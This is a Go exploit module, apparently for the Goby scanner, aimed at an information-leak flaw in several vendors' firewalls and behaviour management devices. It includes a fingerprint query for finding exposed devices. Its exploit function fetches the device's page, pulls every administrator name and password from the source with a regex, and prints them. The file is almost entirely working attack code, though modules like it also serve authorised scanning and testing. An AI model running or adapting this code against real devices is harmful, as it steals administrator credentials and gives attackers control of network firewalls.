package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Multiple firewall devices information leakage vulnerabilities",
    "Description": "Many security vendors' firewalls and online behavior management equipment have information leakage vulnerabilities. Attackers can obtain user accounts and passwords by reviewing the source code of web pages, which leads to the disclosure of administrator user authentication information. Through this vulnerability, a malicious attacker can obtain the administrator account password and log in to the device to control the firewall or Internet behavior management device",
    "Product": "Multiple firewall",
    "Homepage": "",
    "DisclosureDate": "2021-07-06",
    "Author": "go0p",
    "FofaQuery": "body=\"Get_Verify_Info(hex_md5(user_string).\"",
    "GobyQuery": "body=\"Get_Verify_Info(hex_md5(user_string).\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": null,
    "RealReferences": [
        "https://forum.butian.net/share/177"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "infoleak"
    ],
    "CVEIDs": null,
    "CVSSScore": "N/A",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "6814"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			if resp, err := httpclient.SimpleGet(hostinfo.FixedHostInfo); err == nil &&
				strings.Contains(resp.RawBody, "get_dkey_passwd") && strings.Contains(resp.RawBody, "\"password\":\"") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo); err == nil &&
				strings.Contains(resp.RawBody, "get_dkey_passwd") && strings.Contains(resp.RawBody, "\"password\":\"") {
				res := regexp.MustCompile(`"name":"(.*?)","password":"(.*?)"`).FindAllStringSubmatch(resp.RawBody, -1)
				for _, v := range res {
					expResult.Output += "User:" + v[1] + "\n"
					expResult.Output += "PWD:" + v[2] + "\n"
				}
				expResult.Success = true
			}
			return expResult
		},
	))
}
